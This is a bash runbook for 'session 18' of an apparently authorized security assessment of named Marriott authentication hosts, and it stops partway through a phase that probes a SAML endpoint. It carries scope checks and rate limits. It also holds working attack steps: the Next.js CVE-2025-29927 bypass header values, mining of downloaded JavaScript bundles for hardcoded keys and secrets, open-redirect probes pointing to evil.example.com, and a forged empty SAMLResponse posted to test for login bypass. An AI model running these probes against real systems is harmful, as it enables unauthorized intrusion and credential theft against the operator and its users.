#!/usr/bin/env bash
# PI-RUNBOOK-session18-saml-graphql.sh
#
# SESSION 18 — SAMLRequest decode + graphql-chunk mining + auth-apc OIDC probe + CT retry
#
# CONTEXT:
#   Session 17 confirmed:
#     - auth-apc.marriott.com = Next.js + PingFederate (PR_INFORMATION header)
#     - graphql-chunk-793e1a2cf24c51e7.js exists but unmined
#     - nodeForgeVendor-4e937f79b0795bc3.js = client-side crypto (PKCE/JWT interest)
#     - efast.marriott.com = SAML SP; auto-submits AuthnRequest to extranetcloud.marriott.com
#     - extranetcloud.marriott.com = OUT-OF-SCOPE (do NOT probe)
#     - efast body saved at /tmp/s17/efast-body.html; SAMLRequest base64 captured
#     - ACS URL (AssertionConsumerServiceURL) unknown — decode to find it
#     - crt.sh still 502; CT enum (M013) needs alternative source
#
# SCOPE GUARD (non-negotiable):
#   SCOPE_FILE=config/marriott-scope.yaml ./scripts/scope-check.sh <host>
#   All targets confirmed IN-SCOPE before first byte sent.
#   extranetcloud.marriott.com = OUT-OF-SCOPE — must NOT be probed.
#
# TARGETS:
#   efast.marriott.com       (M021 — in-scope SP surface)
#   auth-apc.marriott.com    (M020 — Next.js + PingFederate)
#   CT enum wildcards        (M013 — apigwc, apigatewayc, uat, gateway-apc)
#
# PHASES:
#   A — Decode SAMLRequest from efast-body.html (ACS URL discovery)
#   B — Download + mine graphql-chunk + nodeForge vendor bundle (auth-apc)
#   C — auth-apc OIDC/Next.js API surface probe + buildManifest route enum
#   D — Probe efast ACS URL (from Phase A) for unsigned POST acceptance
#   E — CT enum retry via Certspotter API + wayback CDX API
#   F — Decision gate
#   G — CVE probe: CVE-2025-29927 (Next.js middleware bypass) + CVE-2023-40148 (PingFederate SSRF)
#
# CVE INTEL (researched 2026-06-22):
#   CVE-2025-29927 — Next.js middleware auth bypass (CVSS 9.1, fixed 14.2.25/15.2.3)
#     Exploit: send any protected GET with header "x-middleware-subrequest: middleware"
#     For v15+: header value = "middleware:middleware:middleware:middleware:middleware" (5x)
#     The middleware path component = location of middleware.ts relative to project root
#     Test values: "middleware", "src/middleware", "pages/middleware"
#     Impact: ALL middleware-protected routes accessible without auth — Critical if auth is middleware-only
#   CVE-2023-40148 — PingFederate unauthenticated SSRF (CVSS 6.5, affects PF >= 11.0.0)
#     Via forged HTTP POST to PingFederate runtime endpoints (adapter callbacks, ext/ref)
#     Impact: SSRF to internal network resources
#
# OUTPUT: /tmp/s18/
# SAFE: GET only unless Phase D ACS POST (benign unsigned assertion, no real creds)
# RATE LIMIT: 1-2 req/s max; sleep 2 between bursts

set -euo pipefail
OUTDIR=/tmp/s18
mkdir -p "$OUTDIR"
exec > >(tee "$OUTDIR/session18.log") 2>&1

SCOPE_FILE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../" && pwd)/config/marriott-scope.yaml"
SCOPE_SCRIPT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../" && pwd)/scripts/scope-check.sh"

scope_check() {
  local host="$1"
  result=$(SCOPE_FILE="$SCOPE_FILE" "$SCOPE_SCRIPT" "$host" 2>&1) || true
  echo "scope[$host] => $result"
  if ! echo "$result" | grep -q "^IN-SCOPE"; then
    echo "ABORT: $host is not IN-SCOPE. Skipping."
    return 1
  fi
  return 0
}

BASE_URL_EFAST="https://efast.marriott.com"
BASE_URL_APC="https://auth-apc.marriott.com"
APC_ASSET_BASE="https://auth-apc.marriott.com/mi-assets/mi-static/mi-account-renderer/web-rel-26.6.1-5d80cc6-11089/_next/static"

# ─────────────────────────────────────────────────────────────────────────────
echo "================================================================"
echo "PHASE A — Decode SAMLRequest from efast-body.html"
echo "================================================================"

scope_check "efast.marriott.com" || { echo "SKIP Phase A — scope check failed"; goto_phase_b=1; }

EFAST_BODY="/tmp/s17/efast-body.html"

if [ ! -f "$EFAST_BODY" ]; then
  echo "WARNING: /tmp/s17/efast-body.html not found — re-fetching efast to get SAML form"
  curl -s -L --max-time 20 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "$BASE_URL_EFAST/" \
    -o "$OUTDIR/efast-body-refetch.html"
  EFAST_BODY="$OUTDIR/efast-body-refetch.html"
  echo "A0: Refetched efast body -> $OUTDIR/efast-body-refetch.html"
  echo "A0: Size: $(wc -c < "$EFAST_BODY") bytes"
else
  echo "A0: Found /tmp/s17/efast-body.html ($(wc -c < "$EFAST_BODY") bytes)"
fi

echo ""
echo "--- A1: Show SAML form snippet ---"
grep -i "samlrequest\|RelayState\|SAMLResponse\|action=\|method=" "$EFAST_BODY" | head -20 || echo "A1: No SAML keywords found in body"

echo ""
echo "--- A2: Extract SAMLRequest base64 value ---"
# Try multiple extraction patterns for robustness
SAML_B64=""

# Pattern 1: hidden input name="SAMLRequest" value="..."
SAML_B64=$(grep -oP '(?i)name="SAMLRequest"[^>]*value="\K[^"]+' "$EFAST_BODY" 2>/dev/null || true)
if [ -z "$SAML_B64" ]; then
  # Pattern 2: value="..." name="SAMLRequest"
  SAML_B64=$(grep -oP '(?i)value="\K[^"]+(?="[^>]*name="SAMLRequest")' "$EFAST_BODY" 2>/dev/null || true)
fi
if [ -z "$SAML_B64" ]; then
  # Pattern 3: any attribute starting with PD9 (<?xml in base64)
  SAML_B64=$(grep -oP 'value="PD[A-Za-z0-9+/=]{20,}"' "$EFAST_BODY" | grep -oP '(?<=value=")[^"]+' | head -1 || true)
fi
if [ -z "$SAML_B64" ]; then
  # Pattern 4: Python fallback
  SAML_B64=$(python3 - <<'PYEOF' 2>/dev/null || true
import re, sys
with open("/tmp/s17/efast-body.html", "r", errors="replace") as f:
    html = f.read()
# Try name="SAMLRequest" value="..." or value="..." name="SAMLRequest"
m = re.search(r'name=["\']SAMLRequest["\'][^>]*value=["\']([A-Za-z0-9+/=\s]{20,})["\']', html, re.IGNORECASE)
if not m:
    m = re.search(r'value=["\']([A-Za-z0-9+/=\s]{20,})["\'][^>]*name=["\']SAMLRequest["\']', html, re.IGNORECASE)
if not m:
    # Any long base64-looking value that starts with PD9 (<?xml)
    m = re.search(r'value=["\'](\s*PD[A-Za-z0-9+/=\s]{20,})["\']', html, re.IGNORECASE)
if m:
    val = m.group(1).replace('\n','').replace('\r','').replace(' ','')
    print(val)
PYEOF
)
fi

if [ -z "$SAML_B64" ]; then
  echo "A2: FAILED — could not extract SAMLRequest base64. Check efast-body.html manually."
  echo "A2: Showing raw HTML near 'action' tags:"
  grep -i "action=" "$EFAST_BODY" | head -5 || true
  grep -i "SAMLRequest\|saml" "$EFAST_BODY" | head -10 || true
else
  echo "A2: SAMLRequest base64 extracted (first 100 chars): ${SAML_B64:0:100}..."
  echo "$SAML_B64" > "$OUTDIR/samlrequest-b64.txt"
  echo "A2: Saved to $OUTDIR/samlrequest-b64.txt"
fi

echo ""
echo "--- A3: Decode SAMLRequest XML ---"
if [ -n "$SAML_B64" ]; then
  python3 - <<PYEOF 2>&1 | tee "$OUTDIR/samlrequest-decoded.xml"
import base64, sys, os

b64 = open("$OUTDIR/samlrequest-b64.txt").read().strip()
# SAML HTTP POST binding: base64-encoded (NOT deflate-compressed)
try:
    xml_bytes = base64.b64decode(b64)
    xml = xml_bytes.decode("utf-8", errors="replace")
    print(xml)
except Exception as e:
    # Try URL-safe base64
    try:
        xml_bytes = base64.urlsafe_b64decode(b64 + "==")
        xml = xml_bytes.decode("utf-8", errors="replace")
        print(xml)
    except Exception as e2:
        print(f"DECODE ERROR: {e} / {e2}")
        sys.exit(1)
PYEOF
  echo ""
  echo "A3: Decoded XML saved to $OUTDIR/samlrequest-decoded.xml"
else
  echo "A3: Skipped — no base64 to decode"
fi

echo ""
echo "--- A4: Extract key fields from decoded XML ---"
if [ -f "$OUTDIR/samlrequest-decoded.xml" ] && grep -q "AuthnRequest\|saml" "$OUTDIR/samlrequest-decoded.xml" 2>/dev/null; then
  python3 - <<'PYEOF'
import sys, os, re

try:
    xml = open("/tmp/s18/samlrequest-decoded.xml").read()
except:
    print("A4: Cannot read decoded XML")
    sys.exit(0)

fields = {
    "AssertionConsumerServiceURL": r'AssertionConsumerServiceURL=["\']([^"\']+)["\']',
    "Destination":                  r'Destination=["\']([^"\']+)["\']',
    "Issuer":                       r'<[^>]*Issuer[^>]*>([^<]+)<',
    "ID":                           r'\bID=["\']([^"\']+)["\']',
    "Version":                      r'\bVersion=["\']([^"\']+)["\']',
    "ForceAuthn":                   r'\bForceAuthn=["\']([^"\']+)["\']',
    "IsPassive":                    r'\bIsPassive=["\']([^"\']+)["\']',
    "NameIDPolicy Format":          r'NameIDPolicy[^>]*Format=["\']([^"\']+)["\']',
    "AuthnContextClassRef":         r'<[^>]*AuthnContextClassRef[^>]*>([^<]+)<',
    "RequestedAuthnContext Comparison": r'RequestedAuthnContext[^>]*Comparison=["\']([^"\']+)["\']',
    "Signature":                    r'<ds:Signature|<Signature',
}

print("=== SAMLRequest Key Fields ===")
for name, pattern in fields.items():
    m = re.search(pattern, xml, re.IGNORECASE | re.DOTALL)
    if m:
        val = m.group(1) if '(' in pattern else "PRESENT"
        print(f"  {name}: {val}")
    else:
        print(f"  {name}: NOT FOUND")

# Check if signed
if "<ds:Signature" in xml or "<Signature" in xml:
    print("\nWARNING: SAMLRequest is SIGNED — SP signs its own requests to IdP.")
    print("         This is NOT a vulnerability; it's normal SAML2 behavior.")
    print("         The ACS URL is still the key target for unsigned response testing.")
else:
    print("\nNOTE: SAMLRequest is UNSIGNED — this is normal for HTTP POST binding.")
    print("      SP sends unsigned AuthnRequest; IdP authenticates and returns SIGNED response.")

PYEOF
else
  echo "A4: Skipped — decoded XML not available or not SAML content"
fi

echo ""
echo "--- A5: Extract efast form action URL (POST target = IdP SSO endpoint) ---"
grep -oP 'action="https?://[^"]+' "$EFAST_BODY" 2>/dev/null | head -5 || \
  grep -oP "action='https?://[^']+" "$EFAST_BODY" 2>/dev/null | head -5 || \
  echo "A5: No form action URL found via grep"

echo ""
echo "--- A6: Extract RelayState value ---"
grep -oP '(?i)name="RelayState"[^>]*value="\K[^"]+' "$EFAST_BODY" 2>/dev/null | head -3 || \
  echo "A6: No RelayState value found (may be empty or absent)"

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE B — Download + mine auth-apc JS bundles"
echo "================================================================"

scope_check "auth-apc.marriott.com" || { echo "SKIP Phase B"; }

APC_CHUNKS_DIR="$OUTDIR/apc-chunks"
mkdir -p "$APC_CHUNKS_DIR"

# Chunk list from Session 17 (partial — 5 of 27 downloaded)
# Priority targets: graphql-chunk (#14) + nodeForge vendor
GRAPHQL_CHUNK="graphql-chunk-793e1a2cf24c51e7.js"
NODEFORGE_CHUNK="nodeForgeVendor-4e937f79b0795bc3.js"

echo "--- B1: Download graphql-chunk ---"
GRAPHQL_URL="${APC_ASSET_BASE}/chunks/${GRAPHQL_CHUNK}"
echo "B1: Fetching $GRAPHQL_URL"
curl -s --max-time 30 \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
  -H "Referer: https://auth-apc.marriott.com/login" \
  "$GRAPHQL_URL" \
  -o "$APC_CHUNKS_DIR/$GRAPHQL_CHUNK"

GQL_SIZE=$(wc -c < "$APC_CHUNKS_DIR/$GRAPHQL_CHUNK" 2>/dev/null || echo 0)
echo "B1: graphql-chunk size: ${GQL_SIZE} bytes"
if [ "$GQL_SIZE" -lt 100 ]; then
  echo "B1: WARNING — file too small; may have failed. Content:"
  cat "$APC_CHUNKS_DIR/$GRAPHQL_CHUNK"
fi

sleep 2

echo ""
echo "--- B2: Download nodeForge vendor bundle ---"
NODEFORGE_URL="${APC_ASSET_BASE}/chunks/${NODEFORGE_CHUNK}"
echo "B2: Fetching $NODEFORGE_URL"
curl -s --max-time 30 \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
  -H "Referer: https://auth-apc.marriott.com/login" \
  "$NODEFORGE_URL" \
  -o "$APC_CHUNKS_DIR/$NODEFORGE_CHUNK"

NF_SIZE=$(wc -c < "$APC_CHUNKS_DIR/$NODEFORGE_CHUNK" 2>/dev/null || echo 0)
echo "B2: nodeForge size: ${NF_SIZE} bytes"

sleep 2

echo ""
echo "--- B3: Mine graphql-chunk for GraphQL schema/operations/endpoints ---"
if [ "$GQL_SIZE" -gt 100 ]; then
  python3 - <<PYEOF 2>&1 | tee "$OUTDIR/graphql-mining.txt"
import re, json, sys

try:
    js = open("$APC_CHUNKS_DIR/$GRAPHQL_CHUNK").read()
except Exception as e:
    print(f"Cannot read graphql-chunk: {e}")
    sys.exit(0)

print(f"File size: {len(js)} bytes")
print()

# 1. GraphQL operation names (query/mutation/subscription)
ops = re.findall(r'(?:query|mutation|subscription)\s+([A-Za-z_][A-Za-z0-9_]*)\s*[({]', js)
ops = sorted(set(ops))
print(f"=== GraphQL Operations ({len(ops)}) ===")
for op in ops[:50]:
    print(f"  {op}")
if len(ops) > 50:
    print(f"  ... and {len(ops)-50} more")

# 2. Likely GraphQL endpoint URLs
print()
urls = re.findall(r'["\`]([^"\`]*graphql[^"\`]*)["\`]', js, re.IGNORECASE)
urls += re.findall(r'["\`]([^"\`]*/api/[^"\`]{3,60})["\`]', js, re.IGNORECASE)
urls = sorted(set(u for u in urls if len(u) > 3 and ' ' not in u))
print(f"=== Potential Endpoints ({len(urls)}) ===")
for u in urls[:30]:
    print(f"  {u}")

# 3. Client IDs / App IDs
print()
cids = re.findall(r'(?:clientId|client_id|appId|app_id)\s*[=:]\s*["\']([^"\']{8,})["\']', js, re.IGNORECASE)
cids = sorted(set(cids))
print(f"=== Client/App IDs ({len(cids)}) ===")
for c in cids:
    print(f"  {c}")

# 4. JWT / token field names
print()
tokens = re.findall(r'["\']([^"\']*(?:token|secret|key|auth|bearer|jwt|access_token|id_token|refresh)[^"\']*)["\']', js, re.IGNORECASE)
tokens = sorted(set(t for t in tokens if 5 < len(t) < 60))
print(f"=== Token/Key Field Names ({len(tokens)}) ===")
for t in tokens[:30]:
    print(f"  {t}")

# 5. Hardcoded secrets or API keys (high-entropy strings)
print()
keys = re.findall(r'["\']([A-Za-z0-9]{32,})["\']', js)
keys = [k for k in keys if not re.match(r'^[a-f0-9]{32,}$', k)]  # skip hex digests
keys = sorted(set(keys))[:20]
print(f"=== Potential Hardcoded Keys (first 20 of {len(keys)}) ===")
for k in keys:
    print(f"  {k}")

# 6. Internal hostnames
print()
hosts = re.findall(r'["\`]([a-z0-9-]+(?:\.[a-z0-9-]+){2,}\.[a-z]{2,})["\`]', js, re.IGNORECASE)
hosts = sorted(set(h.lower() for h in hosts if 'marriott' in h.lower() or 'bonvoy' in h.lower()))
print(f"=== Internal/Marriott Hostnames ({len(hosts)}) ===")
for h in hosts:
    print(f"  {h}")

# 7. gql template literals or document nodes
print()
gql_docs = re.findall(r'gql`([^`]{20,500})`', js, re.DOTALL)
print(f"=== gql Template Literals ({len(gql_docs)}) ===")
for d in gql_docs[:10]:
    print(f"  ---")
    print(f"  {d[:300].strip()}")
print()

PYEOF
else
  echo "B3: Skipped — graphql-chunk not downloaded or too small"
fi

echo ""
echo "--- B4: Mine nodeForge for crypto key material / hardcoded secrets ---"
if [ "$NF_SIZE" -gt 100 ]; then
  python3 - <<PYEOF 2>&1 | tee "$OUTDIR/nodeforge-mining.txt"
import re

try:
    js = open("$APC_CHUNKS_DIR/$NODEFORGE_CHUNK").read()
except Exception as e:
    print(f"Cannot read nodeForge: {e}")
    exit(0)

print(f"File size: {len(js)} bytes")

# Look for hardcoded RSA keys or PEM blocks
pem = re.findall(r'-----BEGIN [A-Z ]+-----[^-]+-----END [A-Z ]+-----', js, re.DOTALL)
print(f"\n=== PEM Blocks ({len(pem)}) ===")
for p in pem[:5]:
    print(p[:200])

# Look for base64 blobs that could be keys
b64_keys = re.findall(r'["\']([A-Za-z0-9+/]{64,}={0,2})["\']', js)
b64_keys = [k for k in b64_keys if len(k) > 80][:10]
print(f"\n=== Long Base64 Blobs (possible keys, first 10) ===")
for k in b64_keys:
    print(f"  {k[:80]}...")

# Look for hex-encoded keys
hex_keys = re.findall(r'["\']([0-9a-fA-F]{64,})["\']', js)
hex_keys = sorted(set(hex_keys))[:10]
print(f"\n=== Long Hex Values (first 10) ===")
for k in hex_keys:
    print(f"  {k[:80]}")

PYEOF
else
  echo "B4: Skipped — nodeForge not downloaded or too small"
fi

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE C — auth-apc OIDC / Next.js API surface probe"
echo "================================================================"

scope_check "auth-apc.marriott.com" || { echo "SKIP Phase C"; }

HDR_UA='-A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36"'
HDR_REFERER='-H "Referer: https://auth-apc.marriott.com/login"'

echo "--- C1: OIDC well-known endpoints ---"
for path in \
  "/.well-known/openid-configuration" \
  "/.well-known/oauth-authorization-server" \
  "/.well-known/jwks.json" \
  "/oauth2/.well-known/openid-configuration" \
  "/as/.well-known/openid-configuration" \
  "/pf/.well-known/openid-configuration"
do
  resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    -H "Referer: https://auth-apc.marriott.com/login" \
    "${BASE_URL_APC}${path}" 2>/dev/null || echo "000|0")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  echo "C1 ${path}: ${code}/${size}B"
  sleep 1
done

echo ""
echo "--- C2: Next.js API routes ---"
for path in \
  "/api/auth" \
  "/api/auth/session" \
  "/api/auth/csrf" \
  "/api/auth/providers" \
  "/api/health" \
  "/api/v1/health" \
  "/api/config" \
  "/api/user" \
  "/api/login" \
  "/api/graphql"
do
  resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "${BASE_URL_APC}${path}" 2>/dev/null || echo "000|0")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  echo "C2 ${path}: ${code}/${size}B"
  sleep 1
done

echo ""
echo "--- C3: Next.js data fetch endpoints ---"
# Next.js pages export getServerSideProps via /_next/data/<buildId>/<page>.json
# Build ID is embedded in the HTML — extract it
BUILD_ID=""
LOGIN_HTML="$OUTDIR/apc-login.html"
echo "C3a: Fetching login page HTML..."
curl -s --max-time 15 \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
  "${BASE_URL_APC}/login" \
  -o "$LOGIN_HTML" 2>/dev/null || true

if [ -f "$LOGIN_HTML" ]; then
  BUILD_ID=$(python3 -c "
import re, sys
try:
    html = open('$LOGIN_HTML').read()
    m = re.search(r'\"buildId\":\"([^\"]+)\"', html)
    if m:
        print(m.group(1))
    else:
        # Try __NEXT_DATA__ script tag
        m = re.search(r'__NEXT_DATA__[^>]*>({.*?})</script>', html, re.DOTALL)
        if m:
            import json
            d = json.loads(m.group(1))
            print(d.get('buildId',''))
except Exception as e:
    print('')
" 2>/dev/null || true)
  echo "C3a: Build ID = '${BUILD_ID}'"

  if [ -n "$BUILD_ID" ] && [ "$BUILD_ID" != "" ]; then
    echo ""
    echo "--- C3b: Fetch _buildManifest.js (enumerates ALL app pages/routes) ---"
    # This is the canonical way to enumerate all Next.js pages without brute force
    BUILD_MANIFEST_URL="${BASE_URL_APC}/_next/static/${BUILD_ID}/_buildManifest.js"
    echo "C3b: Fetching $BUILD_MANIFEST_URL"
    curl -s --max-time 20 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      "$BUILD_MANIFEST_URL" \
      -o "$OUTDIR/buildManifest.js"
    BM_SIZE=$(wc -c < "$OUTDIR/buildManifest.js" 2>/dev/null || echo 0)
    echo "C3b: buildManifest.js: ${BM_SIZE}B"
    if [ "$BM_SIZE" -gt 50 ]; then
      echo "C3b: Routes found:"
      python3 - <<PYEOF 2>/dev/null || true
import re, json
try:
    js = open("$OUTDIR/buildManifest.js").read()
    # Extract sortedPages array — the gold standard
    m = re.search(r'"sortedPages"\s*:\s*(\[[^\]]+\])', js)
    if m:
        pages = json.loads(m.group(1))
        print(f"  sortedPages ({len(pages)} routes):")
        for p in sorted(pages):
            print(f"    {p}")
    else:
        # Fallback: extract quoted paths
        paths = re.findall(r'["\'](/[^"\']+)["\']', js)
        paths = sorted(set(p for p in paths if p.startswith('/')))
        print(f"  Paths ({len(paths)}):")
        for p in paths[:50]:
            print(f"    {p}")
except Exception as e:
    print(f"  Error: {e}")
    print(open("$OUTDIR/buildManifest.js").read()[:500])
PYEOF
    fi

    echo ""
    echo "--- C3c: Fetch _middlewareManifest.js (reveals middleware file path — critical for CVE-2025-29927) ---"
    MW_MANIFEST_URL="${BASE_URL_APC}/_next/static/${BUILD_ID}/_middlewareManifest.js"
    echo "C3c: Fetching $MW_MANIFEST_URL"
    curl -s --max-time 15 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      "$MW_MANIFEST_URL" \
      -o "$OUTDIR/middlewareManifest.js"
    MW_SIZE=$(wc -c < "$OUTDIR/middlewareManifest.js" 2>/dev/null || echo 0)
    echo "C3c: middlewareManifest.js: ${MW_SIZE}B"
    if [ "$MW_SIZE" -gt 10 ]; then
      cat "$OUTDIR/middlewareManifest.js"
      # Extract middleware path — this is the exact value needed for CVE-2025-29927
      python3 - <<PYEOF 2>/dev/null || true
import re
js = open("$OUTDIR/middlewareManifest.js").read()
# Look for middleware file path (e.g. "middleware" or "src/middleware")
paths = re.findall(r'["\']([a-z_/]+middleware[a-z_/]*)["\']', js, re.IGNORECASE)
if paths:
    print(f"\nC3c: Middleware paths (use these as x-middleware-subrequest value):")
    for p in sorted(set(paths)):
        print(f"  {p}")
PYEOF
    fi

    echo ""
    echo "--- C3d: Next.js data fetch for enumerated pages ---"
    for page in "login" "index" "home" "error"; do
      resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
        -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
        "${BASE_URL_APC}/_next/data/${BUILD_ID}/${page}.json" 2>/dev/null || echo "000|0")
      code=$(echo "$resp" | cut -d'|' -f1)
      size=$(echo "$resp" | cut -d'|' -f2)
      echo "C3d /_next/data/${BUILD_ID}/${page}.json: ${code}/${size}B"
      sleep 1
    done
  else
    echo "C3: Build ID not found — skipping /_next/data/ and manifest probes"
  fi
fi

echo ""
echo "--- C4: PingFederate-specific endpoints on auth-apc ---"
for path in \
  "/as/authorization.oauth2" \
  "/as/token.oauth2" \
  "/as/userinfo.oauth2" \
  "/as/revoke_token.oauth2" \
  "/as/introspect.oauth2" \
  "/pf/heartbeat.ping" \
  "/idp/startSSO.ping" \
  "/sp/startSSO.ping" \
  "/idp/resumeSAML20.idp" \
  "/sp/ACS.saml2"
do
  resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "${BASE_URL_APC}${path}" 2>/dev/null || echo "000|0")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  echo "C4 ${path}: ${code}/${size}B"
  sleep 1
done

echo ""
echo "--- C5: Open redirect probe on /login ---"
# PingFederate / Next.js auth often have redirect_uri or returnUrl params
for param in "redirect_uri" "next" "returnTo" "return_url" "goto" "target" "RelayState"; do
  URL="${BASE_URL_APC}/login?${param}=https://evil.example.com"
  resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}|%{redirect_url}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "$URL" 2>/dev/null || echo "000|0|")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  redir=$(echo "$resp" | cut -d'|' -f3)
  echo "C5 ?${param}=evil.example.com: ${code}/${size}B redir=${redir}"
  sleep 1
done

echo ""
echo "--- C6: Extract GraphQL endpoint from login page HTML ---"
if [ -f "$LOGIN_HTML" ]; then
  python3 - <<PYEOF 2>&1
import re
try:
    html = open("$LOGIN_HTML").read()
except:
    print("Cannot read login HTML")
    exit(0)

# Look for GraphQL endpoint references
gql_urls = re.findall(r'["\`\']((?:https?://)?[^"\`\' ]*graphql[^"\`\' ]*)["\`\']', html, re.IGNORECASE)
gql_urls = sorted(set(gql_urls))
print(f"=== GraphQL URLs in login HTML ({len(gql_urls)}) ===")
for u in gql_urls:
    print(f"  {u}")

# Look for API base URL config
api_urls = re.findall(r'(?:apiBase|apiUrl|baseUrl|API_URL|GRAPHQL_URL)\s*[=:]\s*["\']([^"\']+)["\']', html, re.IGNORECASE)
api_urls = sorted(set(api_urls))
print(f"\n=== API Base URLs ({len(api_urls)}) ===")
for u in api_urls:
    print(f"  {u}")

# Extract __NEXT_DATA__ for any config
import json
m = re.search(r'<script[^>]*id=["\']__NEXT_DATA__["\'][^>]*>([^<]+)</script>', html, re.DOTALL)
if m:
    try:
        nd = json.loads(m.group(1))
        print(f"\n=== __NEXT_DATA__ keys ===")
        def show_keys(obj, prefix=""):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if isinstance(v, (str, int, bool, float)) and str(v):
                        print(f"  {prefix}{k}: {str(v)[:120]}")
                    elif isinstance(v, dict):
                        show_keys(v, prefix + k + ".")
        show_keys(nd)
    except Exception as e:
        print(f"  Could not parse __NEXT_DATA__: {e}")
PYEOF
fi

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE D — Probe efast ACS URL (from Phase A decode)"
echo "================================================================"
# Only run if Phase A successfully decoded the ACS URL.
# IMPORTANT: We are probing efast.marriott.com (in-scope SP) only.
# Do NOT send requests to extranetcloud.marriott.com (IdP, OUT-OF-SCOPE).

scope_check "efast.marriott.com" || { echo "SKIP Phase D"; }

ACS_URL=""
if [ -f "$OUTDIR/samlrequest-decoded.xml" ]; then
  ACS_URL=$(grep -oP 'AssertionConsumerServiceURL="\K[^"]+' "$OUTDIR/samlrequest-decoded.xml" 2>/dev/null | head -1 || true)
  if [ -z "$ACS_URL" ]; then
    ACS_URL=$(python3 -c "
import re
xml = open('$OUTDIR/samlrequest-decoded.xml').read()
m = re.search(r'AssertionConsumerServiceURL=[\"\'](https?://[^\"\']+)[\"\'\\s]', xml)
if m: print(m.group(1))
" 2>/dev/null || true)
  fi
fi

if [ -z "$ACS_URL" ]; then
  echo "D0: ACS URL not found from SAMLRequest decode. Trying known SAML SP path patterns on efast..."
  # Standard ACS path guesses for Tomcat/ClearTrust → PingFederate migration
  for path in \
    "/SAML2/SP/POST" \
    "/sp/ACS.saml2" \
    "/saml/SSO" \
    "/saml2/sp/acs" \
    "/Shibboleth.sso/SAML2/POST" \
    "/acs" \
    "/sp/acs" \
    "/efast/SAML2/SP/POST" \
    "/efast/sp/ACS.saml2"
  do
    resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      "${BASE_URL_EFAST}${path}" 2>/dev/null || echo "000|0")
    code=$(echo "$resp" | cut -d'|' -f1)
    size=$(echo "$resp" | cut -d'|' -f2)
    echo "D0 ${path}: ${code}/${size}B"
    sleep 1
  done
else
  echo "D0: ACS URL from SAMLRequest: $ACS_URL"

  # Safety check — ensure ACS URL is on efast.marriott.com, not extranetcloud
  ACS_HOST=$(python3 -c "
from urllib.parse import urlparse
print(urlparse('$ACS_URL').netloc)
" 2>/dev/null || echo "")
  echo "D0: ACS host = $ACS_HOST"

  ACS_SCOPE=$(SCOPE_FILE="$SCOPE_FILE" "$SCOPE_SCRIPT" "$ACS_HOST" 2>&1 || true)
  echo "D0: ACS scope check: $ACS_SCOPE"

  if ! echo "$ACS_SCOPE" | grep -q "^IN-SCOPE"; then
    echo "D0: SKIP — ACS URL host ($ACS_HOST) is OUT-OF-SCOPE. Cannot probe ACS."
    echo "D0: This means the IdP and the ACS endpoint are both on extranetcloud.marriott.com."
    echo "D0: SAML attack surface limited to efast SP (relay state, request tampering) only."
  else
    echo ""
    echo "--- D1: Probe ACS URL with GET (expect 405 or SAML error page) ---"
    curl -sv --max-time 15 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      "$ACS_URL" \
      -o "$OUTDIR/acs-get-response.html" 2>&1 | grep -E "^[<>] |HTTP/" | head -20 || true
    echo "D1: ACS GET body (first 500 chars):"
    head -c 500 "$OUTDIR/acs-get-response.html" 2>/dev/null || true

    echo ""
    echo "--- D2: POST empty SAMLResponse to ACS (expect SAML error, NOT redirect to app) ---"
    # A proper IdP would reject unsigned/empty response with an error.
    # A broken SP might log us in with empty assertion.
    curl -sv --max-time 15 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      -X POST \
      --data "SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIj8%2B&RelayState=" \
      "$ACS_URL" \
      -o "$OUTDIR/acs-empty-post.html" 2>&1 | grep -E "^[<>] |HTTP/|location:" | head -20 || true
    echo "D2: ACS empty POST body (first 500 chars):"
    head -c 500 "$OUTDIR/acs-empty-post.html" 2>/dev/null || true

